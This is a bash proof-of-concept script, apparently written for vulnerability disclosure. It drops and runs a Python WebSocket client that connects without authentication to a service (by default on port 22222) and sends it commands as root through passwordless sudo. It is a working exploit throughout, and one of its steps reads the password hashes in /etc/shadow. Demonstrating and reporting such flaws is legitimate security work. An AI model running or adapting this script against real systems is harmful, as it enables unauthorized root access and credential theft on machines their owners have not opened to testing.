#!/bin/bash

# POC: Sudo NOPASSWD Privilege Escalation to Root
# This script demonstrates that the daytona user can execute ANY command as root without a password

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-22222}"

echo "[*] Sudo NOPASSWD Privilege Escalation POC"
echo "[*] Target: ws://${TARGET_HOST}:${TARGET_PORT}/ws"
echo ""

# Create a Python script to interact with the WebSocket
cat > /tmp/ws_sudo_poc.py << 'EOF'
import websocket
import sys
import json
import time

def test_sudo_escalation(host, port):
    try:
        ws_url = f"ws://{host}:{port}/ws"
        print(f"[*] Connecting to WebSocket: {ws_url}")
        
        ws = websocket.create_connection(ws_url)
        print("[+] WebSocket connected successfully (no authentication required)")
        
        # Test 1: Check sudo privileges
        print("\n[*] Test 1: Checking sudo privileges (sudo -l)")
        ws.send("sudo -l")
        time.sleep(0.5)
        response = ws.recv()
        print(f"[+] Response: {response}")
        
        if "NOPASSWD" in response and "ALL" in response:
            print("[!] CRITICAL: sudo NOPASSWD: ALL detected!")
        
        # Test 2: Verify root execution with whoami
        print("\n[*] Test 2: Executing 'sudo whoami' to verify root access")
        ws.send("sudo whoami")
        time.sleep(0.5)
        response = ws.recv()
        print(f"[+] Response: {response}")
        
        if "root" in response.lower():
            print("[!] CRITICAL: Command executed as root!")
        
        # Test 3: Get root ID information
        print("\n[*] Test 3: Executing 'sudo id' to verify root privileges")
        ws.send("sudo id")
        time.sleep(0.5)
        response = ws.recv()
        print(f"[+] Response: {response}")
        
        if "uid=0" in response:
            print("[!] CRITICAL: Confirmed UID=0 (root level access)")
        
        # Test 4: Demonstrate root capability - list sensitive files
        print("\n[*] Test 4: Executing 'sudo cat /etc/shadow' to demonstrate root access to sensitive files")
        ws.send("sudo cat /etc/shadow")
        time.sleep(0.5)
        response = ws.recv()
        if response and "cannot open" not in response.lower() and len(response) > 0:
            print("[+] Response (truncated): " + response[:100] + "...")
            print("[!] CRITICAL: Root can access /etc/shadow!")
        else:
            print("[+] Response: " + response[:100])
        
        # Test 5: Execute arbitrary privileged command
        print("\n[*] Test 5: Executing 'sudo echo PWNED' - arbitrary root command")
        ws.send("sudo echo PWNED")
        time.sleep(0.5)
        response = ws.recv()
        print(f"[+] Response: {response}")
        
        if "PWNED" in response:
            print("[!] CRITICAL: Arbitrary commands executed as root!")
        
        print("\n[*] Closing WebSocket connection")
        ws.close()
        
        print("\n" + "="*60)
        print("[!] VULNERABILITY CONFIRMED:")
        print("[!] Unauthenticated user can escalate to root via sudo NOPASSWD")
        print("[!] Complete system compromise possible")
        print("="*60)
        
        return True
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = sys.argv[2] if len(sys.argv) > 2 else "22222"
    test_sudo_escalation(host, port)
EOF

# Check if websocket-client is installed, if not install it
python3 -c "import websocket" 2>/dev/null || {
    echo "[*] Installing websocket-client library..."
    pip install websocket-client > /dev/null 2>&1
}

# Run the POC
python3 /tmp/ws_sudo_poc.py "$TARGET_HOST" "$TARGET_PORT"

# Cleanup
rm -f /tmp/ws_sudo_poc.py